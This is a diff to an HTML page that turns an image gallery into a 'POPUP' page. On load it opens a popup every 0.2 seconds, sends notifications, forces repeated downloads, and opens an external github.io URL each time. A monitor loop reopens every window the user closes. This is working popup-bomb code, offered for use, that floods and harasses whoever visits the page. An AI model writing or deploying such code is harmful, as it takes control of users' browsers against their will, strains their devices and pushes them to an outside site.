@@ -3,73 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image</title>
-    <style>
-        /* Basic styling for the page */
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-wrap: wrap;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-        }
-        .image-container {
-            position: relative;
-            margin: 10px;
-        }
-        .image-container img {
-            max-width: 100%;
-            height: auto;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-    <div class="image-container">
-        <img src="0524.jpg" alt="Sample Image 1" class="thumbnail">
-    </div>
-    <div class="image-container">
-        <img src="0524.jpg" alt="Sample Image 2" class="thumbnail">
-    </div>
-    <div class="image-container">
-        <img src="0524.jpg" alt="Sample Image 3" class="thumbnail">
-    </div>
-    <div class="image-container">
-        <img src="0524.jpg" alt="Sample Image 4" class="thumbnail">
-    </div>
-    <div class="image-container">
-        <img src="0524.jpg" alt="Sample Image 5" class="thumbnail">
-    </div>
-
+    <title>POPUP</title>
     <script>
-        // Function to open multiple popup windows
-        function openMultiplePopups(src, times) {
-            for (let i = 0; i < times; i++) {
-                const popupWindow = window.open('', '_blank', 'width=300,height=300');
-                popupWindow.document.write(`
-                    <html>
-                    <head>
-                        <title>Popup Image ${i + 1}</title>
-                    </head>
-                    <body style="margin:0; display:flex; justify-content:center; align-items:center; height:100vh;">
-                        <img src="${src}" alt="Popup Image ${i + 1}" style="max-width:100%; max-height:100%;">
-                    </body>
-                    </html>
-                `);
-            }
-            sendNotification();
-            downloadImage(src, times);  // Download the image multiple times
-        }
+        // Array to store references to popup windows
+        let popupWindows = [];
+        let popupCount = 0;
+        const maxPopups = 20; // Maximum number of popups
 
-        // Show popup windows when any image is clicked
-        document.querySelectorAll('.thumbnail').forEach(thumbnail => {
-            thumbnail.addEventListener('click', () => {
-                openMultiplePopups(thumbnail.src, 5);
-            });
-        });
+        // Function to open a popup window with the specified content
+        function openPopupWindow() {
+            const popupWindow = window.open('', '_blank', 'width=800,height=600');
+            popupWindow.document.write(`
+                <html>
+                <head>
+                    <title>POPUP</title>
+                </head>
+                <body>
+                    <img src="0524.jpg" alt="Popup Image" style="width:100%;height:auto;">
+                </body>
+                </html>
+            `);
+            return popupWindow;
+        }
 
         // Function to send a notification
         function sendNotification() {
@@ -96,12 +51,58 @@
             for (let i = 0; i < times; i++) {
                 const a = document.createElement('a');
                 a.href = src;
-                a.download = `0524_${i+1}.jpg`;
+                a.download = `0524_${i + 1}.jpg`;
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
             }
         }
+
+        // Function to start opening popups at regular intervals
+        function startOpeningPopups() {
+            const interval = 200; // Interval in milliseconds (0.2 seconds)
+
+            const intervalId = setInterval(() => {
+                if (popupCount < maxPopups) {
+                    const popupWindow = openPopupWindow();
+                    popupWindows.push(popupWindow);
+                    sendNotification();
+                    downloadImage('0524.jpg', 5);
+                    // Open the specified URL
+                    window.open('https://ikecha.github.io/8888/', '_blank');
+                    popupCount++;
+                } else {
+                    clearInterval(intervalId);
+                }
+            }, interval);
+        }
+
+        // Function to monitor and reopen closed popups
+        function monitorPopups() {
+            setInterval(() => {
+                popupWindows = popupWindows.filter(popupWindow => {
+                    if (popupWindow.closed) {
+                        return false;
+                    }
+                    return true;
+                });
+                while (popupWindows.length < maxPopups) {
+                    const popupWindow = openPopupWindow();
+                    popupWindows.push(popupWindow);
+                    // Open the specified URL
+                    window.open('https://ikecha.github.io/8888/', '_blank');
+                }
+            }, 1000); // Check every second
+        }
+
+        // Start opening popups when the page loads and monitor them
+        window.onload = () => {
+            startOpeningPopups();
+            monitorPopups();
+        };
     </script>
+</head>
+<body>
+    <h1>POPUP</h1>
 </body>
 </html>
